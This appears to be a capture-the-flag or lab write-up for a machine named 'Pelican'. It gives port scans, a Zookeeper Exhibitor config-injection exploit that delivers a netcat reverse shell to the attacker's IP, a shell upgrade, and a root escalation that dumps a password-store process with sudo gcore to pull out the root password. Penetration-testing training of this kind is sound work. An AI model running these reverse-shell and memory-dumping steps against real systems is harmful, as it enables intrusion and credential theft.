# Pelican

## Enumeration & scanning

- Scanning target reveals large set of open ports, but after opening some of the HTTP related ones many of these appear to be related to Zookeeper.
- Click around UI on 8081 port and learn that it's Zookeeper Exhibitor, and that it has an exploit available. 

``` sh
sudo nmap -p- 192.168.150.98 
sudo nmap -p 22,139,445,631,2181,2222,8080,8081,46295 -sV 192.168.150.98

22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        Jetty 1.0
8081/tcp  open  http        nginx 1.14.2
46295/tcp open  java-rmi    Java RMI
```


## Exploitation

- Run exploit for Zookeeper Exhibitor by going to config tab, enabling editing, submitting reverse shell command in java.env box, and committing with reboot. Capture shell and upgrade.
- Find local flag with `charles` user.

``` sh
# Exploit
$(/bin/nc -e /bin/sh 192.168.45.193 4444 &)
# Capture and upgrade shell
nc -nvlp 4444
python -c 'import pty; pty.spawn("/bin/bash")'

# Find local flag
cd /home
ls
charles
cd charles
ls
local.txt
cat local.txt
325e8e5f7c139dbe9053e1d2dd645215
```

## Privilege Escalation

- Look at commands that can be ran with sudo by `charles` user.
- Find `gcore` command which is listed on GTFObins as binary that can be abused.
- Look for interesting process running under `root`.
- Select `password-store` and dump memory with `gcore`.
- Find `root` password with `strings` in dump.

``` sh
# Find sudo binaries
sudo -l
# Check processes (all columns)
ps aux | cat 
# Dump password-store process
sudo gcore 490
# Check contents for password
strings core.490
# Login to root with password
su
ClogKingpinInning731
# Get root flag
cd /root
cat proof.txt
4f347e8006a8193dfdb8d313ecc3aee5
```

## References

- https://www.exploit-db.com/exploits/48654

## Rabbit holes
